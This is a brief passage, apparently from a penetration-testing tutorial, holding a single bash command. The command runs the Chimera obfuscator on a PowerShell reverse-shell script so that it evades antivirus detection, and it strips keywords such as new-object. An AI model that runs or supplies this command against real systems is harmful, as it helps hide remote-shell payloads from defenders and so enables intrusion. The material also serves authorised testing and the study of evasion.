...
```bash
/opt/chimera/chimera.sh -f /opt/chimera/shells/powershell_reverse_shell.ps1 -o /tmp/chimera.ps1 -l 4 -v -c -i -j -g -r -p -h -b new-object,out-string
 ```
